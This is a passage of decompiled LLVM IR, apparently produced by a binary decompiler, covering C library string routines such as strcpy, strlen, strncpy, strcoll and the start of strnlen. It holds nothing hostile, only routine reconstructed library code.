  %v0_1000f538 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f530, i32 %v0_1000f538)
  br i1 %v3_1000f534, label %dec_label_pc_1000f61c, label %dec_label_pc_1000f540

dec_label_pc_1000f540:                            ; preds = %dec_label_pc_1000f52c
  %v0_1000f540 = load i32, i32* @r3, align 4
  %v1_1000f540 = add i32 %v0_1000f540, 1
  store i32 %v1_1000f540, i32* @r3, align 4
  %v1_1000f544 = urem i32 %v1_1000f540, 4
  %v3_1000f544 = icmp eq i32 %v1_1000f544, 0
  %v0_1000f54c.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000f544, label %dec_label_pc_1000f54c, label %dec_label_pc_1000f52c

dec_label_pc_1000f54c:                            ; preds = %dec_label_pc_1000f540, %entry
  %v0_1000f56410 = phi i32 [ %v0_1000f5442, %entry ], [ %v1_1000f540, %dec_label_pc_1000f540 ]
  %v0_1000f54c = phi i32 [ %v1_1000f524, %entry ], [ %v0_1000f54c.pre, %dec_label_pc_1000f540 ]
  %v1_1000f54c = mul i32 %v0_1000f54c, 256
  %v2_1000f554 = or i32 %v1_1000f54c, %v0_1000f54c
  %v1_1000f55c = mul i32 %v2_1000f554, 65536
  %v2_1000f560 = or i32 %v1_1000f55c, %v2_1000f554
  br label %dec_label_pc_1000f564

dec_label_pc_1000f564:                            ; preds = %dec_label_pc_1000f564, %dec_label_pc_1000f618, %dec_label_pc_1000f54c
  %v0_1000f5bc = phi i32 [ %v0_1000f56410, %dec_label_pc_1000f54c ], [ %v1_1000f568, %dec_label_pc_1000f618 ], [ %v1_1000f568, %dec_label_pc_1000f564 ]
  %v1_1000f564 = inttoptr i32 %v0_1000f5bc to i32*
  %v2_1000f564 = load i32, i32* %v1_1000f564, align 4
  %v1_1000f568 = add i32 %v0_1000f5bc, 4
  %v2_1000f570 = xor i32 %v2_1000f564, %v2_1000f560
  %v1_1000f574 = add i32 %v2_1000f564, 2130640639
  %v2_1000f57c = xor i32 %v1_1000f574, %v2_1000f564
  %v1_1000f580 = add i32 %v2_1000f570, 2130640639
  %v2_1000f584 = and i32 %v2_1000f57c, -2130640640
  %v3_1000f584 = xor i32 %v2_1000f584, -2130640640
  %v2_1000f588 = xor i32 %v1_1000f580, %v2_1000f570
  %v2_1000f58c = and i32 %v2_1000f588, -2130640640
  %v3_1000f58c = xor i32 %v2_1000f58c, -2130640640
  %v1_1000f598 = add i32 %v0_1000f5bc, 1
  %tmp = or i32 %v3_1000f58c, %v3_1000f584
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000f564, label %dec_label_pc_1000f5a4

dec_label_pc_1000f5a4:                            ; preds = %dec_label_pc_1000f564
  %v2_1000f5a4 = inttoptr i32 %v0_1000f5bc to i8*
  %v3_1000f5a4 = load i8, i8* %v2_1000f5a4, align 1
  %v4_1000f5a4 = zext i8 %v3_1000f5a4 to i32
  %v1_1000f5a8 = add i32 %v0_1000f5bc, 2
  %v1_1000f5ac = add i32 %v0_1000f5bc, 3
  %v4_1000f5b0 = icmp eq i32 %v4_1000f5a4, %v0_1000f54c
  br i1 %v4_1000f5b0, label %dec_label_pc_1000f5bc, label %dec_label_pc_1000f5c4

dec_label_pc_1000f5bc:                            ; preds = %dec_label_pc_1000f5a4
  ret i32 %v0_1000f5bc

dec_label_pc_1000f5c4:                            ; preds = %dec_label_pc_1000f5a4
  %v3_1000f5b4 = icmp eq i8 %v3_1000f5a4, 0
  br i1 %v3_1000f5b4, label %dec_label_pc_1000f61c, label %dec_label_pc_1000f5c8

dec_label_pc_1000f5c8:                            ; preds = %dec_label_pc_1000f5c4
  %v2_1000f5c8 = inttoptr i32 %v1_1000f598 to i8*
  %v3_1000f5c8 = load i8, i8* %v2_1000f5c8, align 1
  %v4_1000f5c8 = zext i8 %v3_1000f5c8 to i32
  %v4_1000f5cc = icmp eq i32 %v4_1000f5c8, %v0_1000f54c
  br i1 %v4_1000f5cc, label %dec_label_pc_1000f5d8, label %dec_label_pc_1000f5e0

dec_label_pc_1000f5d8:                            ; preds = %dec_label_pc_1000f5c8
  ret i32 %v1_1000f598

dec_label_pc_1000f5e0:                            ; preds = %dec_label_pc_1000f5c8
  %v3_1000f5d0 = icmp eq i8 %v3_1000f5c8, 0
  br i1 %v3_1000f5d0, label %dec_label_pc_1000f61c, label %dec_label_pc_1000f5e4

dec_label_pc_1000f5e4:                            ; preds = %dec_label_pc_1000f5e0
  %v2_1000f5e4 = inttoptr i32 %v1_1000f5a8 to i8*
  %v3_1000f5e4 = load i8, i8* %v2_1000f5e4, align 1
  %v4_1000f5e4 = zext i8 %v3_1000f5e4 to i32
  %v4_1000f5e8 = icmp eq i32 %v4_1000f5e4, %v0_1000f54c
  br i1 %v4_1000f5e8, label %dec_label_pc_1000f5f4, label %dec_label_pc_1000f5fc

dec_label_pc_1000f5f4:                            ; preds = %dec_label_pc_1000f5e4
  ret i32 %v1_1000f5a8

dec_label_pc_1000f5fc:                            ; preds = %dec_label_pc_1000f5e4
  %v3_1000f5ec = icmp eq i8 %v3_1000f5e4, 0
  br i1 %v3_1000f5ec, label %dec_label_pc_1000f61c, label %dec_label_pc_1000f600

dec_label_pc_1000f600:                            ; preds = %dec_label_pc_1000f5fc
  %v2_1000f600 = inttoptr i32 %v1_1000f5ac to i8*
  %v3_1000f600 = load i8, i8* %v2_1000f600, align 1
  %v4_1000f600 = zext i8 %v3_1000f600 to i32
  %v4_1000f604 = icmp eq i32 %v4_1000f600, %v0_1000f54c
  br i1 %v4_1000f604, label %dec_label_pc_1000f610, label %dec_label_pc_1000f618

dec_label_pc_1000f610:                            ; preds = %dec_label_pc_1000f600
  ret i32 %v1_1000f5ac

dec_label_pc_1000f618:                            ; preds = %dec_label_pc_1000f600
  %v3_1000f608 = icmp eq i8 %v3_1000f600, 0
  br i1 %v3_1000f608, label %dec_label_pc_1000f61c, label %dec_label_pc_1000f564

dec_label_pc_1000f61c:                            ; preds = %dec_label_pc_1000f52c, %dec_label_pc_1000f618, %dec_label_pc_1000f5fc, %dec_label_pc_1000f5e0, %dec_label_pc_1000f5c4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000f568, { 1, 0 }
  uselistorder i32 %v2_1000f564, { 0, 2, 1 }
  uselistorder i32 %v0_1000f5bc, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000f554, { 1, 0 }
  uselistorder i32 %v0_1000f54c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000f540, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000f5442, { 2, 1, 0 }
  uselistorder i32 %v1_1000f524, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f61c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000f564, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f52c, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000f630.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000f628

dec_label_pc_1000f628:                            ; preds = %dec_label_pc_1000f64c, %entry
  %v0_1000f630 = phi i32 [ %v1_1000f634, %dec_label_pc_1000f64c ], [ %v0_1000f630.pre, %entry ]
  %v0_1000f628 = phi i32 [ %v1_1000f62c, %dec_label_pc_1000f64c ], [ %tmp, %entry ]
  %v1_1000f628 = inttoptr i32 %v0_1000f628 to i8*
  %v2_1000f628 = load i8, i8* %v1_1000f628, align 1
  %v3_1000f628 = zext i8 %v2_1000f628 to i32
  %v1_1000f630 = inttoptr i32 %v0_1000f630 to i8*
  %v2_1000f630 = load i8, i8* %v1_1000f630, align 1
  %v3_1000f630 = zext i8 %v2_1000f630 to i32
  %v3_1000f638 = icmp eq i8 %v2_1000f628, 0
  br i1 %v3_1000f638, label %dec_label_pc_1000f644, label %dec_label_pc_1000f64c

dec_label_pc_1000f644:                            ; preds = %dec_label_pc_1000f628
  %v1_1000f644 = sub nsw i32 0, %v3_1000f630
  ret i32 %v1_1000f644

dec_label_pc_1000f64c:                            ; preds = %dec_label_pc_1000f628
  %v4_1000f63c = icmp eq i8 %v2_1000f628, %v2_1000f630
  %v1_1000f634 = add i32 %v0_1000f630, 1
  %v1_1000f62c = add i32 %v0_1000f628, 1
  br i1 %v4_1000f63c, label %dec_label_pc_1000f628, label %dec_label_pc_1000f650

dec_label_pc_1000f650:                            ; preds = %dec_label_pc_1000f64c
  %v2_1000f650 = sub nsw i32 %v3_1000f628, %v3_1000f630
  ret i32 %v2_1000f650

; uselistorder directives
  uselistorder i32 %v3_1000f630, { 1, 0 }
  uselistorder i32 %v0_1000f628, { 1, 0 }
  uselistorder i32 %v0_1000f630, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000f658 = add i32 %arg1, -1
  %v1_1000f65c = sub i32 %v2_1000f658, %tmp
  store i32 %v1_1000f65c, i32* %r9.global-to-local, align 4
  %v2_1000f6604 = load i8, i8* %arg2, align 1
  %v1_1000f6646 = add i32 %tmp, 1
  store i32 %v1_1000f6646, i32* %r4.global-to-local, align 4
  %v3_1000f6688 = icmp eq i8 %v2_1000f6604, 0
  store i1 %v3_1000f6688, i1* %cr7_eq.global-to-local, align 1
  %v5_1000f66c9 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000f6604, i8* %v5_1000f66c9, align 1
  %v0_1000f67010 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f67010, label %dec_label_pc_1000f674, label %dec_label_pc_1000f660.dec_label_pc_1000f660_crit_edge

dec_label_pc_1000f660.dec_label_pc_1000f660_crit_edge: ; preds = %entry, %dec_label_pc_1000f660.dec_label_pc_1000f660_crit_edge
  %v0_1000f660.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000f66c.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f660 = inttoptr i32 %v0_1000f660.pre to i8*
  %v2_1000f660 = load i8, i8* %v1_1000f660, align 1
  %v1_1000f664 = add i32 %v0_1000f660.pre, 1
  store i32 %v1_1000f664, i32* %r4.global-to-local, align 4
  %v3_1000f668 = icmp eq i8 %v2_1000f660, 0
  store i1 %v3_1000f668, i1* %cr7_eq.global-to-local, align 1
  %v4_1000f66c = add i32 %v1_1000f664, %v2_1000f66c.pre
  %v5_1000f66c = inttoptr i32 %v4_1000f66c to i8*
  store i8 %v2_1000f660, i8* %v5_1000f66c, align 1
  %v0_1000f670 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f670, label %dec_label_pc_1000f674, label %dec_label_pc_1000f660.dec_label_pc_1000f660_crit_edge

dec_label_pc_1000f674:                            ; preds = %dec_label_pc_1000f660.dec_label_pc_1000f660_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f660.dec_label_pc_1000f660_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1000f678 = load i32, i32* @r3, align 4
  %v1_1000f6903 = urem i32 %v0_1000f678, 4
  %v3_1000f6905 = icmp eq i32 %v1_1000f6903, 0
  br i1 %v3_1000f6905, label %dec_label_pc_1000f698, label %dec_label_pc_1000f680

dec_label_pc_1000f680:                            ; preds = %entry, %dec_label_pc_1000f68c
  %v0_1000f68c = phi i32 [ %v1_1000f68c, %dec_label_pc_1000f68c ], [ %v0_1000f678, %entry ]
  %v1_1000f680 = inttoptr i32 %v0_1000f68c to i8*
  %v2_1000f680 = load i8, i8* %v1_1000f680, align 1
  %v3_1000f684 = icmp eq i8 %v2_1000f680, 0
  br i1 %v3_1000f684, label %dec_label_pc_1000f6cc, label %dec_label_pc_1000f68c

dec_label_pc_1000f68c:                            ; preds = %dec_label_pc_1000f680
  %v1_1000f68c = add i32 %v0_1000f68c, 1
  %v1_1000f690 = urem i32 %v1_1000f68c, 4
  %v3_1000f690 = icmp eq i32 %v1_1000f690, 0
  br i1 %v3_1000f690, label %dec_label_pc_1000f698, label %dec_label_pc_1000f680

dec_label_pc_1000f698:                            ; preds = %dec_label_pc_1000f68c, %entry
  %v0_1000f69c = phi i32 [ %v0_1000f678, %entry ], [ %v1_1000f68c, %dec_label_pc_1000f68c ]
  br label %dec_label_pc_1000f6a4

dec_label_pc_1000f6a4:                            ; preds = %dec_label_pc_1000f704, %dec_label_pc_1000f6a4, %dec_label_pc_1000f698
  %v1_1000f6e0 = phi i32 [ %v0_1000f69c, %dec_label_pc_1000f698 ], [ %v1_1000f6a8, %dec_label_pc_1000f6a4 ], [ %v1_1000f6a8, %dec_label_pc_1000f704 ]
  %v1_1000f6a4 = inttoptr i32 %v1_1000f6e0 to i32*
  %v2_1000f6a4 = load i32, i32* %v1_1000f6a4, align 4
  %v1_1000f6a8 = add i32 %v1_1000f6e0, 4
  %v1_1000f6b4 = add i32 %v2_1000f6a4, -16843009
  %v2_1000f6b8 = and i32 %v1_1000f6b4, -2139062144
  %v5_1000f6b8 = icmp eq i32 %v2_1000f6b8, 0
  br i1 %v5_1000f6b8, label %dec_label_pc_1000f6a4, label %dec_label_pc_1000f6c0

dec_label_pc_1000f6c0:                            ; preds = %dec_label_pc_1000f6a4
  %v2_1000f6c0 = inttoptr i32 %v1_1000f6e0 to i8*
  %v3_1000f6c0 = load i8, i8* %v2_1000f6c0, align 1
  %v3_1000f6c4 = icmp eq i8 %v3_1000f6c0, 0
  br i1 %v3_1000f6c4, label %dec_label_pc_1000f6cc, label %dec_label_pc_1000f6d4

dec_label_pc_1000f6cc:                            ; preds = %dec_label_pc_1000f680, %dec_label_pc_1000f6c0
  %v1_1000f6cc = phi i32 [ %v1_1000f6e0, %dec_label_pc_1000f6c0 ], [ %v0_1000f68c, %dec_label_pc_1000f680 ]
  %v2_1000f6cc = sub i32 %v1_1000f6cc, %v0_1000f678
  ret i32 %v2_1000f6cc

dec_label_pc_1000f6d4:                            ; preds = %dec_label_pc_1000f6c0
  %v1_1000f6d4 = add i32 %v1_1000f6e0, 1
  %v2_1000f6d4 = inttoptr i32 %v1_1000f6d4 to i8*
  %v3_1000f6d4 = load i8, i8* %v2_1000f6d4, align 1
  %v3_1000f6d8 = icmp eq i8 %v3_1000f6d4, 0
  br i1 %v3_1000f6d8, label %dec_label_pc_1000f6e0, label %dec_label_pc_1000f6ec

dec_label_pc_1000f6e0:                            ; preds = %dec_label_pc_1000f6d4
  %v2_1000f6e0 = sub i32 %v1_1000f6e0, %v0_1000f678
  %v1_1000f6e4 = add i32 %v2_1000f6e0, 1
  ret i32 %v1_1000f6e4

dec_label_pc_1000f6ec:                            ; preds = %dec_label_pc_1000f6d4
  %v1_1000f6ec = add i32 %v1_1000f6e0, 2
  %v2_1000f6ec = inttoptr i32 %v1_1000f6ec to i8*
  %v3_1000f6ec = load i8, i8* %v2_1000f6ec, align 1
  %v3_1000f6f0 = icmp eq i8 %v3_1000f6ec, 0
  br i1 %v3_1000f6f0, label %dec_label_pc_1000f6f8, label %dec_label_pc_1000f704

dec_label_pc_1000f6f8:                            ; preds = %dec_label_pc_1000f6ec
  %v2_1000f6f8 = sub i32 %v1_1000f6e0, %v0_1000f678
  %v1_1000f6fc = add i32 %v2_1000f6f8, 2
  ret i32 %v1_1000f6fc

dec_label_pc_1000f704:                            ; preds = %dec_label_pc_1000f6ec
  %v1_1000f704 = add i32 %v1_1000f6e0, 3
  %v2_1000f704 = inttoptr i32 %v1_1000f704 to i8*
  %v3_1000f704 = load i8, i8* %v2_1000f704, align 1
  %v3_1000f708 = icmp eq i8 %v3_1000f704, 0
  br i1 %v3_1000f708, label %dec_label_pc_1000f710, label %dec_label_pc_1000f6a4

dec_label_pc_1000f710:                            ; preds = %dec_label_pc_1000f704
  %v2_1000f710 = sub i32 %v1_1000f6e0, %v0_1000f678
  %v1_1000f714 = add i32 %v2_1000f710, 3
  ret i32 %v1_1000f714

; uselistorder directives
  uselistorder i32 %v1_1000f6a8, { 1, 0 }
  uselistorder i32 %v1_1000f6e0, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000f68c, { 1, 0, 2 }
  uselistorder i32 %v0_1000f678, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f6cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f680, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000f71c = icmp eq i32 %arg2, 3
  store i1 %v3_1000f71c, i1* %cr7_eq.global-to-local, align 1
  %v1_1000f720 = add i32 %arg1, -1
  store i32 %v1_1000f720, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000f79c, label %dec_label_pc_1000f728

dec_label_pc_1000f728:                            ; preds = %entry
  %v1_1000f728 = udiv i32 %arg2, 4
  store i32 %v1_1000f728, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f730

dec_label_pc_1000f730:                            ; preds = %dec_label_pc_1000f780, %dec_label_pc_1000f728
  %v2_1000f740 = phi i32 [ %v3_1000f778, %dec_label_pc_1000f780 ], [ %v1_1000f720, %dec_label_pc_1000f728 ]
  %v0_1000f730 = load i32, i32* @r4, align 4
  %v1_1000f730 = inttoptr i32 %v0_1000f730 to i8*
  %v2_1000f730 = load i8, i8* %v1_1000f730, align 1
  %v1_1000f734 = add i32 %v0_1000f730, 1
  store i32 %v1_1000f734, i32* %r10.global-to-local, align 4
  %v1_1000f738 = add i32 %v0_1000f730, 2
  store i32 %v1_1000f738, i32* %r8.global-to-local, align 4
  %v3_1000f73c = icmp eq i8 %v2_1000f730, 0
  store i1 %v3_1000f73c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f740 = add i32 %v2_1000f740, 1
  %v4_1000f740 = inttoptr i32 %v3_1000f740 to i8*
  store i8 %v2_1000f730, i8* %v4_1000f740, align 1
  store i32 %v3_1000f740, i32* %r11.global-to-local, align 4
  %v0_1000f744 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f744 = add i32 %v0_1000f744, 1
  store i32 %v1_1000f744, i32* %r9.global-to-local, align 4
  %v0_1000f748 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f748, label %dec_label_pc_1000f788, label %dec_label_pc_1000f74c

dec_label_pc_1000f74c:                            ; preds = %dec_label_pc_1000f730
  %v0_1000f74c = load i32, i32* @r4, align 4
  %v1_1000f74c = add i32 %v0_1000f74c, 1
  %v2_1000f74c = inttoptr i32 %v1_1000f74c to i8*
  %v3_1000f74c = load i8, i8* %v2_1000f74c, align 1
  %v1_1000f750 = add i32 %v0_1000f744, 2
  store i32 %v1_1000f750, i32* @r4, align 4
  %v3_1000f754 = icmp eq i8 %v3_1000f74c, 0
  store i1 %v3_1000f754, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f758 = add i32 %v2_1000f740, 2
  %v4_1000f758 = inttoptr i32 %v3_1000f758 to i8*
  store i8 %v3_1000f74c, i8* %v4_1000f758, align 1
  store i32 %v3_1000f758, i32* %r11.global-to-local, align 4
  %v0_1000f75c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f75c, label %dec_label_pc_1000f788, label %dec_label_pc_1000f760

dec_label_pc_1000f760:                            ; preds = %dec_label_pc_1000f74c
  %v0_1000f760 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f760 = add i32 %v0_1000f760, 1
  %v2_1000f760 = inttoptr i32 %v1_1000f760 to i8*
  %v3_1000f760 = load i8, i8* %v2_1000f760, align 1
  %v3_1000f764 = icmp eq i8 %v3_1000f760, 0
  store i1 %v3_1000f764, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f768 = add i32 %v2_1000f740, 3
  %v4_1000f768 = inttoptr i32 %v3_1000f768 to i8*
  store i8 %v3_1000f760, i8* %v4_1000f768, align 1
  store i32 %v3_1000f768, i32* %r11.global-to-local, align 4
  %v0_1000f76c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f76c, label %dec_label_pc_1000f788, label %dec_label_pc_1000f770

dec_label_pc_1000f770:                            ; preds = %dec_label_pc_1000f760
  %v0_1000f770 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f770 = add i32 %v0_1000f770, 1
  %v2_1000f770 = inttoptr i32 %v1_1000f770 to i8*
  %v3_1000f770 = load i8, i8* %v2_1000f770, align 1
  %v3_1000f774 = icmp eq i8 %v3_1000f770, 0
  store i1 %v3_1000f774, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f778 = add i32 %v2_1000f740, 4
  %v4_1000f778 = inttoptr i32 %v3_1000f778 to i8*
  store i8 %v3_1000f770, i8* %v4_1000f778, align 1
  store i32 %v3_1000f778, i32* %r11.global-to-local, align 4
  %v0_1000f77c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f77c, label %dec_label_pc_1000f788, label %dec_label_pc_1000f780

dec_label_pc_1000f780:                            ; preds = %dec_label_pc_1000f770
  %v0_1000f780 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f780 = add i32 %v0_1000f780, -1
  store i32 %v1_1000f780, i32* %ctr.global-to-local, align 4
  %v2_1000f780 = icmp eq i32 %v1_1000f780, 0
  br i1 %v2_1000f780, label %dec_label_pc_1000f79c, label %dec_label_pc_1000f730

dec_label_pc_1000f788:                            ; preds = %dec_label_pc_1000f770, %dec_label_pc_1000f760, %dec_label_pc_1000f74c, %dec_label_pc_1000f730
  %v1_1000f788 = phi i32 [ %v3_1000f778, %dec_label_pc_1000f770 ], [ %v3_1000f768, %dec_label_pc_1000f760 ], [ %v3_1000f758, %dec_label_pc_1000f74c ], [ %v3_1000f740, %dec_label_pc_1000f730 ]
  %v2_1000f78811 = sub i32 %arg1, %v1_1000f788
  %v2_1000f78c = add i32 %v2_1000f78811, %arg2
  %v1_1000f790 = add i32 %v2_1000f78c, -1
  store i32 %v1_1000f790, i32* %r9.global-to-local, align 4
  %v4_1000f790 = icmp eq i32 %v1_1000f790, 0
  %v0_1000f794 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f790, i32 %v0_1000f794)
  %v2_1000f7cc.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f7c4

dec_label_pc_1000f79c:                            ; preds = %dec_label_pc_1000f780, %entry
  %v1_1000f79c = urem i32 %arg2, 4
  store i32 %v1_1000f79c, i32* %r9.global-to-local, align 4
  %v3_1000f79c = icmp eq i32 %v1_1000f79c, 0
  %v0_1000f7a0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f79c, i32 %v0_1000f7a0)
  store i32 %v1_1000f79c, i32* %ctr.global-to-local, align 4
  %v2_1000f7b8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f7a8

dec_label_pc_1000f7a8:                            ; preds = %dec_label_pc_1000f7c0.dec_label_pc_1000f7a8_crit_edge, %dec_label_pc_1000f79c
  %v2_1000f7b8 = phi i32 [ %v3_1000f7b8, %dec_label_pc_1000f7c0.dec_label_pc_1000f7a8_crit_edge ], [ %v2_1000f7b8.pre, %dec_label_pc_1000f79c ]
  %v0_1000f7ac = phi i32 [ %v0_1000f7ac.pre, %dec_label_pc_1000f7c0.dec_label_pc_1000f7a8_crit_edge ], [ %v1_1000f79c, %dec_label_pc_1000f79c ]
  %v0_1000f7a8 = load i32, i32* @r4, align 4
  %v1_1000f7a8 = inttoptr i32 %v0_1000f7a8 to i8*
  %v2_1000f7a8 = load i8, i8* %v1_1000f7a8, align 1
  %v1_1000f7ac = add i32 %v0_1000f7ac, -1
  store i32 %v1_1000f7ac, i32* %r9.global-to-local, align 4
  %v1_1000f7b0 = add i32 %v0_1000f7a8, 1
  store i32 %v1_1000f7b0, i32* @r4, align 4
  %v3_1000f7b4 = icmp eq i8 %v2_1000f7a8, 0
  store i1 %v3_1000f7b4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f7b8 = add i32 %v2_1000f7b8, 1
  %v4_1000f7b8 = inttoptr i32 %v3_1000f7b8 to i8*
  store i8 %v2_1000f7a8, i8* %v4_1000f7b8, align 1
  store i32 %v3_1000f7b8, i32* %r11.global-to-local, align 4
  %v0_1000f7bc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f7bc = add i32 %v0_1000f7bc, -1
  store i32 %v1_1000f7bc, i32* %ctr.global-to-local, align 4
  %v2_1000f7bc = icmp eq i32 %v1_1000f7bc, 0
  br i1 %v2_1000f7bc, label %dec_label_pc_1000f7d4, label %dec_label_pc_1000f7c0

dec_label_pc_1000f7c0:                            ; preds = %dec_label_pc_1000f7a8
  %v0_1000f7c0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f7c0, label %dec_label_pc_1000f7c4, label %dec_label_pc_1000f7c0.dec_label_pc_1000f7a8_crit_edge

dec_label_pc_1000f7c0.dec_label_pc_1000f7a8_crit_edge: ; preds = %dec_label_pc_1000f7c0
  %v0_1000f7ac.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f7a8

dec_label_pc_1000f7c4:                            ; preds = %dec_label_pc_1000f7c0, %dec_label_pc_1000f788
  %v2_1000f7cc.pre = phi i32 [ %v2_1000f7cc.pre.pre, %dec_label_pc_1000f788 ], [ %v3_1000f7b8, %dec_label_pc_1000f7c0 ]
  %v0_1000f7c4 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000f7c4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f7c8

dec_label_pc_1000f7c8:                            ; preds = %dec_label_pc_1000f7c8, %dec_label_pc_1000f7c4
  %v2_1000f7cc = phi i32 [ %v3_1000f7cc, %dec_label_pc_1000f7c8 ], [ %v2_1000f7cc.pre, %dec_label_pc_1000f7c4 ]
  %v3_1000f7cc = add i32 %v2_1000f7cc, 1
  %v4_1000f7cc = inttoptr i32 %v3_1000f7cc to i8*
  store i8 0, i8* %v4_1000f7cc, align 1
  store i32 %v3_1000f7cc, i32* %r11.global-to-local, align 4
  %v0_1000f7d0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f7d0 = add i32 %v0_1000f7d0, -1
  store i32 %v1_1000f7d0, i32* %ctr.global-to-local, align 4
  %v2_1000f7d0 = icmp eq i32 %v1_1000f7d0, 0
  br i1 %v2_1000f7d0, label %dec_label_pc_1000f7d4, label %dec_label_pc_1000f7c8

dec_label_pc_1000f7d4:                            ; preds = %dec_label_pc_1000f7a8, %dec_label_pc_1000f7c8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000f7d0, { 1, 0 }
  uselistorder i32 %v3_1000f7cc, { 1, 2, 0 }
  uselistorder i32 %v1_1000f7bc, { 1, 0 }
  uselistorder i32 %v3_1000f7b8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000f79c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000f780, { 1, 0 }
  uselistorder i32 %v3_1000f778, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f7d4, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000f7d8 = load i32, i32* @r4, align 4
  %v3_1000f7d8 = icmp eq i32 %v0_1000f7d8, 0
  %v0_1000f7e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f7d8, i32 %v0_1000f7e4)
  %v1_1000f7f4 = load i32, i32* @r4, align 4
  %v2_1000f7f4 = add i32 %v1_1000f7f4, %tmp
  %v3_1000f7f8 = icmp ugt i32 %v2_1000f7f4, %tmp
  %v4_1000f7f8 = icmp eq i32 %v1_1000f7f4, 0
  %v2_1000f7fc = or i1 %v4_1000f7f8, %v3_1000f7f8
  br i1 %v2_1000f7fc, label %dec_label_pc_1000f804, label %dec_label_pc_1000f800

dec_label_pc_1000f7ec:                            ; preds = %dec_label_pc_1000f86c
  br label %dec_label_pc_1000f8b0

dec_label_pc_1000f800:                            ; preds = %entry
  br label %dec_label_pc_1000f804

dec_label_pc_1000f804:                            ; preds = %entry, %dec_label_pc_1000f800
  %v0_1000f8b4 = phi i32 [ %v2_1000f7f4, %entry ], [ -1, %dec_label_pc_1000f800 ]
  %v1_1000f8346 = urem i32 %tmp, 4
  %v3_1000f8348 = icmp eq i32 %v1_1000f8346, 0
  br i1 %v3_1000f8348, label %dec_label_pc_1000f83c, label %dec_label_pc_1000f80c

